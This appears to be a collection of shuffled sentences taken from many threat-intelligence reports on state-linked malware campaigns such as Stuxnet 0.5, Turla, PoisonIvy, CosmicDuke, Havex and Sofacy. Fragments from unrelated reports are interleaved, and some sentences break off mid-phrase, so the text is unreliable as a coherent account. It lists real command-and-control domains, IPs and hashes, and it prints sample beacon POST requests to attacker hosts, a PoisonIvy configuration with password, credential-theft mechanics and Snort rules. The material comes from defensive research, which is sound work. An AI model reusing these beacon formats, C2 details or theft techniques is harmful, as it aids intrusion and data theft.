Once injected into the services.exe process , a copy of the main Stuxnet binary and a companion DLL that implements the payload are saved to disk in encrypted form along with a MRXCLS.SYS load point driver .
Both files are loaded by the usbacc11.sys driver and then injected into the svchost.exe and iexplore.exe processes .
Stuxnet 0.5 arrives as an infected Step 7 project archive containing both the s7hkimdb.dll and XR000001.MDX files .
The export AUTDoVerb is hijacked and the malicious s7otbxdx.dll file can call the export with magic values ( 0x91E55A3D , 0x996AB716 , 0x4A5CBB03 ) in order to build or provide a previously built DB8061 data block for injection .
ApiLog/Types – modified to trigger DLL loading vulnerability XUTILS/links/S7P00001.DBF – configuration file XUTILS/listen/S7000001.MDX – payload DLL ( installation.dll ) XUTILS/listen/XR000000.MDX – main Stuxnet binary ( outbreak.dll ) hOmSave7/subfolder/s7hkimdb.dll - loader Similar to Stuxnet 1.x versions , Stuxnet 0.5 has limited command-and-control ability .
Figure 5 Table 9 W32.Duqu http : //www.symantec.com/security_response/writeup.jsp ? docid=2011-101814-1119-99 W32.Flamer http : //www.symantec.com/security_response/writeup.jsp ? docid=2012-052811-0308-99 W32.Stuxnet http : //www.symantec.com/security_response/writeup.jsp ? docid=2010-071400-3123-99 Multiple Siemens SIMATIC Products DLL Loading Arbitrary Code Execution Vulnerability ( CVE-2012-3015 ) http : //www.securityfocus.com/bid/54651 Stuxnet 0.5 : The Missing Link http : //www.symantec.com/connect/blogs/stuxnet-05-missing-link Stuxnet 0.5 : Disrupting Uranium Processing At Natanz http : //www.symantec.com/connect/blogs/stuxnet-05-disrupting-uranium-processing-natanz Stuxnet 0.5 : How it Evolved http : //www.symantec.com/connect/blogs/stuxnet-05-how-it-evolved Stuxnet 0.5 : Command-and-Control Capabilities http : //www.symantec.com/connect/blogs/stuxnet-05-command-and-control-capabilities Symantec would like to thank the Institute for Science and International Security ( ISIS ) for their continued assistance in understanding centrifugal uranium enrichment systems .
A second driver , PCIBUS.SYS , is also created which causes a forced reboot by generating a BSoD ( Blue Screen of Death ) 20 days after installation .
Stuxnet needs to ultimately spread on isolated networks with no Internet access , therefore it has been designed to be autonomous to reduce the need for robust and fine grained command-and-control .
Next , Stuxnet 0.5 sends the following request : This may download and execute a file if an update is available .
The first request by Stuxnet 0.5 uses the following form : This notifies the C & C server of an active successful infection .
This allows us to draw the following diagram of the C & C infrastructure as of November 2012 : For the Command and Control servers , the various generations of the backdoor connect to different scripts : For instance , the script `` /cgi-bin/nt/th '' is being used to receive commands from the command-and- control server , usually in the form of new plugins to run on the victim 's computer .
Most `` interesting '' out of those are : A list of the most popular domains used for command and control can be found below : Interestingly , although the domain `` dll-host-update.com '' appears in one of the malware configurations , it had not been registered by the attackers .
The main difference between these categories is their behavior on the infected system : `` Offline '' : exists as files on local disk , capable of creating its own system registry keys , local disk log files , and may communicate with C & C servers on their own .
Each malware sample contains three such domains , which are hardcoded inside the main backdoor component : Step-by-step description ( 2nd stage ) After a connection with the C & C server is established , the backdoor starts the communication process , which leads to the loading of additional modules .
This file is essentially a backdoor , which is decoded by the loader module ( svchost.exe ) .
The C & C infrastructure is actually a chain of servers working as proxies and hiding the location of the 'mothership ' control server .
Broad variety of targets : Beside traditional attack targets ( workstations ) , the system is capable of stealing data from mobile devices , such as smartphones ( iPhone , Nokia , Windows Mobile ) , enterprise network equipment ( Cisco ) , removable disk drives ( including already deleted files via a custom file recovery procedure ) .
`` Online '' : exists only in system memory and is never saved to local disk , do not create registry keys , all logs are also kept in memory instead of local disk and sends the result of work to the C & C server using own code .
For example , stolen credentials were compiled in a list and used when the attackers needed to guess secret phrase in other locations .
On any infected system , every major task is performed by the main backdoor component .
The initial payload in that case was a mail attachment , an exploited PDF file ( readme.pdf , md5 72bdca7dd12ed04b21dfa60c5c2ab6c4 ) which downloaded and decoded an encoded blob ( md5 ec16143a14c091100e7af30de03fce1f ) from the site www.humanright-watch.org , not to be confused with the legitimate Human Rights ' Watch website hrw.org .
The Command & Control servers used are in many cases organized through well-known dynamic DNS providers such as 3322.org , zapto.org and so on , but there are also a few seemingly directly registered second level domains .
The decoded file was a Maudi dropper , self-signed using the name `` soft @ hotmail.com '' , and the dropped component belonged to the `` JinDiQIAO @ hotmail.com '' -signed cluster .
For example , the malware dropper cc1a806d25982acdb35dd196ab8171bc , a WinRAR SFX executable installed through the use of the Word exploit CVE-2012-0158 , contained a PlugX component configured to connect to ppt.bodologetee.com .
o yt.bodologetee.com – domain This domain has been used as Command & Control domain for a number of samples .
PoisonIvy code blobs are preconfigured in the PoisonIvy builder program to contain information about which Command & Control server to contact , which port to establish connection on , and various other parameters .
The installer then spawns explorer.exe , which then automatically loads the malicious library through a mechanism called DLL hijacking aka DLL preloading .
What quickly becomes obvious is that most of the samples are connected ; either they use the same certificate , or their certificate cluster is connected with other clusters through common Command & Control servers .
The malicious library then reads and directly calls the PoisonIvy code in user.dat , which establishes an encrypted communication with the configured C & C server .
This is partly accurate as Maudi trojans in almost all cases install the well known PoisonIvy remote access trojan .
The malware is a '' root kit '' that hides the presence of the spying operation and also creates a hidden , encrypted file system to store stolen data and tools used by the attackers , he said .
Chien said that in some cases when a command and control server was taken offline , Turla 's operators have quickly pushed out new versions of the malware that directed infected computers to new command and control servers .
Hackers use Turla to establish a hidden foothold in infected networks from which they can search other computers , store stolen information , then transmit data back to their servers .
They have used dozens of different '' command and control '' servers located in countries around the world to control infected systems , according to Symantec , whose researchers have helped identify and shut down some of those systems .
The operators can download specialized tools onto an infected system , adding any functionality they want by including it in the encrypted file system , Blasco said .
Those tools include password stealers , tiny programs for gathering information about the system and document stealers .
Symantec Corp estimates up to 1,000 networks have been infected by Turla and a related virus , Agent.BTZ .
Researchers say Turla 's code is regularly updated , including changes to avoid detection as anti-­virus companies detect new strains .
Experts in state-­sponsored cyber attacks say that Russian government-­backed hackers are known for being highly disciplined , adept at hiding their tracks , extremely effective at maintaining control of infected networks and more selective in choosing targets than their Chinese counterparts .
The threat surfaced this week after a little known German anti-­virus firm , G Data , published a report on the virus , which it called Uroburos , the name text in the code that may be a reference to the Greek symbol of a serpent eating its own tail .
This Trojan.APT.9002 variant connected to a command and control server at 111.68.9.93 over port 443 .
MD5 acbc249061a6a2fb09271a68d53567d9 and 90a37e54c53ffb78969644b1a7038e8c are both Trojan.APT.9002 variants and connect to a command and control server at 58.64.143.244 .
This variant connected to a command and control server at ad04.bounceme.net .
It uses a non-HTTP protocol as well as an HTTP POST for communicating with the remote server .
Figure 1 – Initial XOR decoding of shellcode , with key '0x9F' Figure 2 – Shellcode launches rundll32.exe and injects payload After transfer of control to the injected payload in rundll32.exe , the shellcode is then subjected to two more levels of XOR decoding with the keys '0×01′ , followed by '0x6A ' .
If the attacker did not immediately seize control of infected endpoints , they risked losing these compromised endpoints , as the endpoints could have been rebooted at any time – thus automatically wiping the in-memory Trojan.APT.9002 malware variant from the infected endpoint .
This technique will further complicate network defenders ' ability to triage compromised systems , using traditional forensics methods .
Figure 7 – Sample callback beacons of the diskless 9002 RAT payload Figure 8 – XOR decrypted callback beacons of the diskless 9002 RAT payload The XOR decoded data always contains the static value `` \x09\x12\x11\x20″ at offset 16 .
The older traditional version of 9002 RAT had a static 4-byte identifier at offset 0 in the callback network traffic .
Alternatively , the use of this non-persistent first stage may suggest that the attackers were confident that their intended targets would simply revisit the compromised website and be re-infected .
Some of C & C servers that we have seen from our accumulated data are as follows : To start its connection to its C & C server , the backdoor component will first send 5-bytes ( \x01\x00\x00\x00\x33 ) .
The backdoor then replies with a beacon message , the contents of which are as follows : Either backdoor identifier 1 or backdoor identifier 2 acts as the campaign code or marker for EvilGrab campaigns , which is recognizable by the C & C server and/or attacker .
It then collects autocomplete entries from the following registry key : It then initiates a brute force attack on encrypted credentials using the CryptUnprotectData API .
However , it will only try to steal passwords from IE 's password-protected sites and MSN Explorer Signup if kav.exe ( related to a security product ) is not running in the system .
EvilGrab steals user credentials related to the following applications and/or protocols : EvilGrab steals these credentials by parsing the following registry keys : It queries the above keys for related values that correspond to the applications and protocols listed earlier .
It is then sent back to the backdoor 's C & C server .
If the active window is Tencent QQ ( specifically , QQ2009 through QQ2012 ) , EvilGrab will attempt to steal information by directly reading the process 's memory and checking if the class name of the focused window is not named `` EDIT .
The file on the hard drive is encrypted ; specifically , the data is XORed with the key 0x66 .
The file on the hard drive is encrypted ; specifically , the data is XORed with the key 0x66 .
By default , this backdoor injects itself into the svchost.exe or winlogon.exe process .
'' Of all the samples we 've tied to this activity so far noted in this blog , this is the only one configured to connect directly to an IP address for Command and Control ( C2 ) .
We do n't have enough data to say for certain that all of the malware in this blog was delivered via compromised legitimate websites .
Historically , Nitro is known for targeted spear phishing campaigns and using Poison Ivy malware , which was not seen in these attacks .
Table 4 Table 5 The malware dropped was configured to use good.myftp [ .
The filename matches that of the sample in Table 5 , which had a very similar third level C2 domain and the same IP resolution .
It is simple for companies to block any outbound traffic to this IP , which would negate the effort Nitro put into successfully delivering the malware .
34 AV vendors within VirusTotal properly classify the first sample as malware , and 40 AV Vendors the second sample .
Table 7 As this post and previous cited research show , APT groups such as Nitro will continue to evolve their techniques within the kill chain to avoid detection .
This IP address has been in use by this group for some time , which is interesting since they have evolved other components of their kill chain over time to ensure malware delivery , but oddly not altered their C2 infrastructure .
In most instances , the malware is one commonly referred to as '' Spindest , '' though we also found `` PCClient '' and `` Farfli '' variants in use by the group .
The different ways it collects information from the infected machine are as follows : yy Keylogger yy Taking screenshots yy Stealing data from clipboard yy Stealing files yy Stealing PKI certificates and associated private keys yy Stealing usernames and passwords from browsers , instant messengers and email clients yy Stealing WLAN passwords yy Stealing Windows password hashes The information collected by the malware is automatically uploaded to remote servers via FTP .
Once launched , the file drops the malware onto the system ( such files are therefore referred to as droppers in the rest of this documents ) .
The data collection components include a keylogger , clipboard stealer , screenshotter , and password stealers for a variety of popular chat , email and web browsing programs .
The service itself is very straightforward : it opens a handle to explorer.exe process , duplicates its process token , reads the path of the actual malware binary from registry ( key HKLM\Software\JavaSoft , value Supplement ) and starts the malware using the duplicated process token .
DROPPER : DECOYS CosmicDuke dropper files all display some kind of a decoy document or image to distract the user when the attack file is launched .
Key logging is skipped if one of the following AV process is running on the system : Cosmu takes screenshots periodically and sends them to the attacker , together with other stolen data .
The 256-character string is generated by selecting characters randomly from the following 32-character alphabet : abcdefghijklmnopqrstuvwxyz012345 The malware uses the FTP servers and WebDav servers both for exfiltrating the collected data and for updating the malware .
When active on an infected machine , CosmicDuke will search for and harvest login details from a range of programs and forward the data to remote servers , some of which were active at the time of writing .
Meanwhile , the most recent sample in Group # 3 , which uses the updated loader with t the SHA1 value fecdba1d903a51499a3953b4df1d850fbd5438bd , also connects to another server at IP address 178.21.172.157 .
The first group of samples ( Group # 1 ) is spread using 3 dropper files that display specific decoy documents .
Address and open port information is below : Basic detection can be based on 3 queries that are initiated by the victim computers within seconds .
For example , we recovered the following two files : md5sum base.cat :113e6fc85317fdd135e3f5f19e6c7a58 *base.cat md5sum ~6rld.tmp : c786a4cdfe08dbe7c64972a14669c4d1 *~6rld.tmp where base.cat is the startup file , which is created based on ~6lrd.tmp .
base.cat is stored in the `` All users '' directory , whereas ~6lrd.tmp is stored in a user 's directory , e.g. , in the guest user directory as `` C : \Documents and Settings\guest\Local Settings\Application Data\~6rld.tmp '' This user directory contains at least one more file , update.cmd with a specific content that could be used for detection .
The following is the summary of potential detection steps : • Check if there is only one GET parameter • ( check if path is not empty and contains index.php ) ( possible , but not confirmed ) • convert the Base64-like GET parameter string into real Base64 encoding , and check if it decodes correctly • check if the decoded string has at least two delimieter character `` | '' in it • check if after the last but first `` | '' character , there are digits only • check if the version part of the string follows the format `` 1.11 '' or similar The header sent is fairly standard , but we include one example nonetheless : The used Agent strings vary significantly across queries , therefore they can not be really used for detection : The Google search step also uses different agent strings : The C & C server 's response – if it sends encrypted files – is a GIF file containing a small icon , and after that , the malware : For stage 3 ( i.e. , < id > .gif
refers to pieces of stage 2 of the malware , which are downloaded from the C & C server by the stage 1 code .
We identified the following C & C servers delivering stage 2 and stage 3 codes : The C & C server used by stage 3 of the malware is news.grouptumbler.com and it is located in Panama .
`` C : \WINDOWS\system32\rundll32.exe '' C : \DOCUME~1\ALLUSE~1\APPLIC~1\base.cat , JorNgoq The running process of the malware can be pinpointed , e.g. , by using ProcessExplorer .
The running copies of stage 1 and 2 appear as separated rundll.exe processes .
Commands received via this channel trigger the download of stage 2 and stage 3 code from the C & C server .
Then , we can observe the first query from the victim towards the stage 2/3 delivery C & C server .
The server executable is responsible for installing the 9002 payload malware , and has its configuration block stored in its .data
When the threat actor builds a malware executable , the builder writes the server executable to disk and overwrites the configuration block with the newly configured options .
Nullsoft is a script-driven tool that simplifies the installation routines of executable files onto the Microsoft Windows operating system .
As an experiment , we used NSIS v2.34 to create our own simple installer and found that the XML in the manifest had no new-line or tab characters .
The DTL campaign appears to depend primarily on spear-phishing email as an initial infection vector .
When executed , the Ru.pad62 samples we found called back to these CnC servers : • ru.pad62 [ .
When executed , the DTL samples called back to these CnC servers : • dtl.eatuo [ .
When executed , the Downmicrisoft samples called back to these CnC servers : • wv.downmicrisoft [ .
When executed , Luckme samples called back to these CnC servers : • luckmegame.servegame [ .
When executed , the Sunshop samples beaconed to these CnC servers : • appupdate.myvnc [ .
Going back to the malware process tree we can see that Binder launches the following command , which is instructing Windows utility rundll32.exe to load Sayad Client DiagnosticsService.dll , obtain the function address of the native API named `` 78121 '' via GetProcAddress ( ) , and call the function pointer of the entry point `` 78121 '' .
Sayad Client DLL 's main entry point initializes and starts up all data collection methods that the assembly implements .
There are several interesting aspects of Sayad malware , and after running the malicious executable through the Vinsula Execution Engine to analyze its behavior , I discovered that the initial executable titled WEXTRACT.exe ( SHA1:1c52b749403d3f229636f07b0040eb17beba28e4 ) was in fact a self extracting EXE that dropped and launched the Binder executable malware , ~8f60957b3689075fa093b047242c0255.exe ( SHA1:69fd05ca3a7514ea79480d1dbb358fab391e738d ) .
DLL implements the data collecting logic and sends the collected data to the C2 server .
The stolen data being uploaded to the malicious server is encrypted first using a RSA public key which is stored in the malware configuration file .
We have come across an intriguing piece of malware ( dubbed Sayad ) that implements multiple host data collection methods and wraps them up into a single .NET
The Binder ensures that the malware will survive reboots by registering the command for loading and executing the Client DLL ( DiagnosticsService.dll ) to run at startup as shown below .
As we can see in the cascade tree above , the main malware WEXTRACT.exe is a self-extracting executable which extracts the Binder ~8f60957b3689075fa093b047242c0255.exe , and it then launches it .
version installed on the machine and drops the information stealer DLL component , Sayad ( aka Client ) – DiagnosticsService.dll ( SHA1:8521eefbf7336df5c275c3da4b61c94062fafdda ) .
The Sayad malware does n't seem to be implementing any sophisticated mechanisms for collecting and transmitting the stolen data .
The module transmits the collected information in the body of the POST request and gets new commands from the server 's response .
The module uses Wininet API functions for issuing HTTP POST requests to the server .
If failed , tries to write to the file f : \keyhook.log Each time the keylogger starts , it appends the following header to the log file : -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- New Session : % fully qualified computer name % % timestamp % -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- It then creates a hidden console window and registers its only export _LowLevelKeyboardProc @ 12 as a hook procedure for low-level keyboard input events ( WH_KEYBOARD_LL hook ) .
It collects most of the available information about the system , transmits it to the C & C server and executes the commands it receives back .
This indicates the backdoor can also function as a plugin for the Turla Carbon system .
When there is a file waiting for upload ( usually , this is file that contains the results of the previously received and executed command ) , it is read from disk and uploaded to the server instead of the system information .
Every command is encrypted using asymmetric encryption with temporary AES session keys .
Every time a new window becomes active , it retrieves its name and the path to its application and writes this information to the log file : [ % path to the application 's executable file % : `` % window title % '' ] Analyzed file ( others are similar ) : Compilation timestamp : 2013.10.15 10:43:09 ( GMT ) File format : PE32 DLL , modified ( the file is supposed to be started by a custom loader ) Exports : The main functionality is implemented in a single function that is called by the DllMain entry point .
It is extracted into a temporary file named % TEMP % \~D % random % .tmp
The payload , if exists , is supposed to be an executable file and may be executed if there is a corresponding command present in the INI part .
The sample analyzed carried a Web browser password recovery tool originating from http : //securityxploded.com/browser-password-decryptor.php • The RunExeCmdSingle component is a DLL file that drops and executes another executable .
The following are examples of a POST request and a POST response : POST request example : POST /wp08/wp-includes/dtcla.php ? id=285745296322896178920098FD80-20 & v1=038 & v2=17 0393861 & q=5265882854508EFCF958F979E4 HTTP/1.1 User-Agent : Mozilla/5.0 ( Windows ; U ; Windows NT 6.1 ; en-US ) AppleWebKit/525.19 ( KHTML , like Gecko ) Chrome/1.0.154.36 Safari/525.19 Host : toons.freesexycomics.com Content-Length : 0 Cache-Control : no-cache POST response example : HTTP/1.1 200 OK Date : Wed , 22 Jan 2014 13:40:48 GMT Content-Type : text/html Transfer-Encoding : chunked Connection : keep-alive Server : Apache/1.3.37 ( Unix ) Cache-Control : no-cache 9f65 < html > < head > < mega http-equiv='CACHE-CONTROL ' content='NO-CACHE ' > < / head > < body > No data ! < ! -- havexQlpoOTFBWSZTWWYvDI0BOsD//////////////////////////////////// /////////4oB+93VVXu69DuN7XYzds9yt49Ques [ ...
identifiant=51032 _ 175129256364 Example POST request for C & C server check-in POST /check _ value.php HTTP/1.1 User-Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 6.1 ; .NET
The earliest method was an email spear phishing campaign , which saw selected executives and senior employees in target companies receive emails containing a malicious PDF attachment .
Post infection , Backdoor.Oldrea will attempt to collect system information such as OS , user name , computer name , country , language , nation , Internet adapter configuration information , available drives , default browser , running processes , desktop file list , My Documents , Internet history , program files , and root of available drives .
Trojan.Karagany ! gen1 may create the following additional files in the installation folder : • Form.api • inact.api • prog.cer • Cent.api • ie.pdb It then creates a C : \ProgramData\Mail\MailAg\gl directory as a temporary directory used for uploading files .
Both are Remote Access Tool ( RAT ) type malware which provide the attackers with access and control of compromised computers .
A number of sites that use content management systems were exploited and an iframe was used in order to redirect visitors to sites hosting the Lightsout exploit kit .
• The GetFileCmd modules check for the existence of specific files on the infected host .
Oldrea acts as a back door for the attackers on to the victim 's computer , allowing them to extract data and install further malware .
- % TEMP % \AdobeARM.exe - % TEMP % \iTunesHelper.exe - % PROGRAMS % \Startup\AdobeRe.exe - rouj.exe - % USERPROFILE % \Local Settings\iexplore.exe - % USERAPPDATA % \Microsoft\wuauclt.exe - % PROGRAMS % \Startup\adobeup.exe - % TEMP % \AdobeUpdater.exe - NTLMSVC.DLL - % PROGRAMS % \Startup\adobe_sl.lnk - % TEMP % \runinfo.exe Product : SoundMAX service agent Description : Microsoft NTLM Service Holder Product & Description : JpgAsp System based indications of possible compromise by the comment crew attackers .
This document details the following types of indictors : - Network - File - System - Email The contents of this document are indicators only and may match legitimate services or applications .
File based indications of possible compromise by the comment crew attackers .
Network based indications of possible compromise by the comment crew attackers .
See our accompanying blog for more information .
This document contains additional Comment Crew indicators of compromise that were seen in the past year .
Additional verification is required to confirm an actual compromise .
Email based indications of possible compromise by the comment crew attackers .
When executed , the original sample created another executable file in the Windows ' temporary folder ( C : \Users\ [ USERNAME ] \AppData\Local\Temp ) named `` Trojan.exe '' , which corresponds to the code of the RAT itself .
This is used to save all keystrokes and system activity to another file in the same location , `` Trojan.exe.tmp '' .
The real log file was one where all keystrokes were recorded and later sent from the computer via a TCP connection .
The first button ( ‫فيش عام شامل‬ , General Global File ) uses `` data-base.db.exe '' ( MD5 8f16efb51fe67961e e31c4f36cbe11db ) , which was placed into `` C : \Users\User\AppData\Roaming '' and , when executed , extracts the Excel spreadsheet file `` Data-Base.xslx '' ( MD5 f0a8a1556efbb106b6297700d4cce61b ) from the `` Data-Base.db '' ( MD5 95a5c3e91bbb4a3a323433841fbef82a ) file in the main folder .
The sample 38e3bc8776915dbd2e55a4d90f85a872 , named `` Kimawi.exe '' and with JPG icon , is a RAT file bound to the picture `` Kimawi.jpg '' .
Captured information is sent to a dynamic domain corresponding to the host `` hacars11.no-ip.biz '' , using local port 1177 with no SSL encryption ( but base64 encoded ) , making the analysis of the network traffic a much easier task .
The file `` data-base.db '' is a compressed archive : • Product name from the file signature : Project1 • Publisher name from the signature : Syrian malware • Compilation Timestamp : 2013-11-09 14:47:26 When system32.exe is run , the process `` iexplorer.exe '' is spawned and is automatically registered for Startup .
Old samples Samples obtained during 2013 are simple RAT executable files , compressed and sent to victims using a wide range of delivery options .
After our initial analysis , the file named `` ‫فضائح‬.exe '' proved to be heavily obfuscated with the commercial utility `` MaxToCode '' for .NET
Different remote administration tools have been spotted in the wild ; most of them provide an extensive range of functionality to fully control infected systems .
Delivery Vector We believe that the Molerats attacker uses spear phishing to deliver weaponized RAR files containing their malicious payloads to their victims in at least two different ways .
Attacks Guide for CIOs , CFOs , and Enter Poison Ivy CISOs on why traditional security defenses are failing We observed several attacks in June and July 2013 against targets in the Middle East and the U.S. that dropped a and how losing the security PIVY payload that connected to command-­and-­control ( CnC ) infrastructure used by the Molerats attackers .
files containing a key to secure communications between the compromised computer and the attacker 's machine .
The popular remote access tool ( RAT ) , which we recently detailed on this blog , is being used in a broad campaign of attacks launched from the Middle East , too .
We also believe that this actor sends spear-­phishing emails that include links to RAR files hosted on third-­party platforms such as Dropbox .
The malware dropped an instance of PIVY with the following configuration : ID : F16 08-07-2013 Group : DNS/Port : Direct : toornt.servegame.com:443 , Proxy DNS/Port : Proxy Hijack : No ActiveX Startup Key : HKLM Startup Entry : File Name : Install Path : C : \Documents and Settings\Admin\Local Settings\Temp\morse.exe Keylog Path : C : \Documents and Settings\Admin\Local Settings\Temp\morse Inject : No Process Mutex : gdfgdfgdg Key Logger Mutex : ActiveX Startup : No HKLM Startup : No Copy To : No Melt : No Persistence : No Keylogger : No Password : ! @ # GooD # @ ! We collected additional PIVY samples that had the same password or linked to CnC infrastructure at a common IP address ( or both ) .
The PIVY sample in question had an MD5 hash of 9dff139bbbe476770294fb86f4e156ac and communicated with a CnC server at toornt.servegame.com over port 443 .
The Molerats actor will in some cases attach the weaponized RAR file directly to their spear-­ phishing-­emails .
Here are the file details : Hamas shoot down Israeli F-16 fighter jet by modern weapon in Gaza sea.doc- – - – - – - – - – - -.scr MD5 : 7084f3a2d63a16a191b7fcb2b19f0e0d This malware was signed with a forged Microsoft certificate similar to previous XtremeRat samples .
The sample a8714aac274a18f1724d9702d40030bf dropped a decoy document in Arabic that contained a biography of General Adbel Fattah el-­Sisi – the Commander-­in-­Chief of the Egyptian Armed Forces .
Taking a deeper look at the decrypted malicious code , this malware was found to contain at least the following functions : Download file Download and execute or load library Change sleep duration Open and close interactive sessions Malware is increasingly becoming more contextually advanced .
This malware was analysed to be a backdoor that allows the attacker to remote control the infected system .
As depicted in the diagram below , the spear phishing document ( which exploits CVE-2012-0158 ) creates a decoy document and a malware dropper named exp1ore.exe .
Of these , one of the spear phishing documents was suspected to have used a potentially stolen document as a decoy .
Next , the malware simply leverages the Google Docs viewer to retrieve the command from the malicious server ( see Figure below ) .
The shellcode has a decryption stub which decrypts its body using the XOR key 0x9E , and this shellcode is used to extract exp1ore.exe ( malware ) and Wor.doc ( benign document ) .
The exp1ore.exe and Wor.doc were found within the spear phishing document encrypted using the same key ( 0xFC ) and technique .
This will in turn install a copy of wab32res.dll as msnetrsvw.exe inside the windows directory to be registered as Windows service .
This dropper will then drop wab.exe ( Address Book Application ) and wab32res.dll ( malicious DLL ) inside the temp folder .
The encrypted executable file and benign document were identified to be located inside the spear phishing document at offsets 0×2509 and 0×43509 respectively .
Command and Control : During this stage the infected host system establishes a communications channel to a command and control ( C & C ) server operated by the at- tackers .
Once this channel has been established the at- tackers can issue commands and download further mal- ware on to the system Additional attacker actions : After a successful com- promise is established , attackers can conduct a number of actions including ex-ﬁltrating data from the infected host and transmitting it back to attackers through a process of encrypting , compressing , and transferring to a server 2 operated by the attackers .
Second , having participants forward us e-mails does not allow us to verify if the targeted organi- zation was successfully compromised by the attack ( e.g. , if another member of the organization open and executed malware on their machine ) and what the scope of the at- tack was .
Compromise : During this stage malicious code is exe- cuted on a target machine typically after a user initiated action such as opening a malicious document or link .
By contrast targeted malware attacks are designed for speciﬁc targets , sent in lower volumes , and are moti- vated by the objective of stealing speciﬁc sensitive data from a target .
Our primary data source is a collection of e-mails identiﬁed by participants as suspicious which were forwarded to a dedicated e- mail server administered by our research team .
Figure 2 : Breakdown of malicious e-mails based on whether they deliver malware as an attachment , refer use to a link with a malicious ﬁle , or attempt to phish the data from the user .
The infected host may also serve as a starting point to infect other machines on the network and seek out speciﬁc information or credentials .
For example , it is plausible that if every user in a partic- ular community began to avoid opening attachments and document-based malware infected fewer targets , attack- ers may move on to vectors such as waterhole attacks or attacks on cloud document platforms to ﬁll the gap .
We also perform analysis of network trafﬁc from the attachment to identify the C & C server the malware attempts to contact .
The pages used for phishing typically used obfuscated code to redirect the user to another webpage : In some pages the malicious redirect was disabled by the attackers , by placing additional JavaScript on the page which would redirect users to a legitimate site preferentially .
Sample 5e3bea788e89e0814e898b4a648b93c0b74f7e2c Decoy documents are used in conjunction with malware droppers in order to make the target believe the file they have just opened is legitimate .
The usage of malware in targeted attacks to steal information of value to attackers has been widely reported , however the simple technique of phishing for credentials , whilst still relatively common in targeted attacks , is still more typically associated with criminal attackers involved in day to day cyber-fraud .
The new domain names mimicked organisations in the following categories : • International and European diplomatic institutions • Popular providers of web services • Military institutions , contractors and conferences • Energy companies • News organisations based out of the United States and Central Europe In addition to new malware samples , we also found examples where the attackers were using the simple technique of phishing for credentials .
Recommended Actions As ever with phishing attacks , one of the most important preventative steps you can take is to educate staff on how to identify suspicious emails – especially as there are fewer technical measures that can be taken to prevent low distribution phishing attacks which aim to steal credentials than there are for similar attacks involving malware .
For example the screenshot below shows the contents of a credential phishing website designed to mimic the legitimate OWA site of a defence contractor .
More recently , ESET have reported5 on related spear phishes using NATO/Ukrainian conflict themes and watering hole attacks likely targeting the defence industry and a Polish finance company .
The following signatures detect Javascript that is present on many obfuscated redirects , not necessarily related to this activity but which may be indicative of Sofacy phishing : alert tcp $ EXTERNAL_NET $ HTTP_PORTS - > $ HOME_NET any ( msg : '' Potential Sofacy Phishing Redirect '' ; flow : established , to_client ; content : '' \ '' \\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\ '' '' ; classtype : trojan-activity ; reference : url , http : //pwc.blogs.com/cyber_security_updates/2014/10/phresh-phishing-against- government-defence-and-energy.html ; sid : xxxxxx ; rev:1 ; ) alert tcp $ EXTERNAL_NET $ HTTP_PORTS - > $ HOME_NET any ( msg : '' Potential Sofacy Phishing Redirect '' ; flow : established , to_client ; content : '' \ '' x6Cx6Fx63x61x74x69x6Fx6E\ '' '' ; classtype : trojan-activity ; reference : url , http : //pwc.blogs.com/cyber_security_updates/2014/10/phresh-phishing-against- government-defence-and-energy.html ; sid : xxxxxx ; rev:1 ; ) The following comment occurs in many of the pages we 've observed relating to this campaign , but can also appear in some legitimate sites : alert tcp $ EXTERNAL_NET $ HTTP_PORTS - > $ HOME_NET any ( msg : '' Potential Sofacy Phishing Redirect '' ; flow : established , to_client ; content : '' // stop for sometime if needed '' ; classtype : trojan-activity ; reference : url , http : //pwc.blogs.com/cyber_security_updates/2014/10/phresh-phishing-against- government-defence-and-energy.html ; sid : xxxxxx ; rev:1 ; ) For more information on this threat actor and further indicators of compromise , please get in touch with us at threatintelligence @ uk.pwc.com .
Appendix 1 - Domains Domains involved in this phishing campaign and associated domains used by the same threat actor : References http : //smallmedia.org.uk/sites/default/files/u8/IIIPSepOct.pdf https : //twitter.com/MalCrawler/status/489128440323252226 The information contained in this document has been prepared as a matter of interest and for information purposes only , and does not constitute professional advice .
Organisations with good logging for their e-mail data could attempt to detect activity relating to compromised accounts by alerting on `` impossible journeys '' , where locations from which users log in are monitored and where alerts are produced when a single user logs in from two separate countries in a short period of time .
As a result , it is difficult for a malicious third-party to install an untrusted application , such as a remote access Trojan ( RAT ) , onto a system that is adequately protected with the Bit9 platform .
The attackers bundled this Intel driver application with variants of Backdoor.Moudoor using a popular Chinese archiving application called Haozip .
The attackers installed Backdoor.Hikit , a Trojan that provides extremely stealthy remote access to compromised systems .
The other Trojans that share these traits are : • Backdoor.Vasport • Backdoor.Boda File creation template % TEMP % \uid.ax % % TEMP % % \ % s.ax % % TEMP % % \ % s _ p.ax Command and control template POST http : // % ls : % d/ % x HTTP/1.1 Content-Length : 2 CONNECT % ls : % d HTTP/1.1 Connection : keep-alive lynx There is also evidence that Backdoor.Vasport and Trojan .
Interestingly , Backdoor.Boda and Backdoor.Vasport were both distributed using Flash zero-day exploits in embedded documents .
This is this domain that links to the Bit9 attack , as it resolved to 66.153.86.14 – a C & C server used by the Backdoor .
Backdoor.Vasport was delivered by exploiting the Adobe Flash Player CVE-2012-0779 Object Type Confusion Remote Code Execution Vulnerability ( CVE-2012-0779 ) .
With Moudoor and Naid using different command-and-control ( C & C ) servers , each team could work independently on alternative objectives .
Hikit sample installed after the successful SQL injection attack on Bit9 .
Due to an operational oversight , a public-facing server that was n't protected with the Bit9 platform allowed the attackers to gain unauthorized access .
The feature does the same in OrcaRat : check for some date and time written in a file , and sleep for as long as needed before deleting the aforementioned file .
Actually : and to obtain Di ( the original data that gives us Ei once encrypted ) , we must perform the following operation : where master_key is `` OrcaKiller '' for the OrcaRat sample .
But when we look at a more recent sample of LeoUncia , we have one with the above string and two other interesting strings : `` \r\nThe Remote Shell Execute : % s completed ! \r\n '' `` \r\nReturnTime Set Error ! \r\n '' `` \r\nReturnTime set success ! \r\n '' These two strings are linked to the writing in the hibernation file , and indicates to the C & C manager that its command either succeeded or failed .
In both case , the first goal of the customization is to avoid the presence of some `` / '' in any encoded data , because it would break down the process of cutting the URI along with the `` / '' separator .
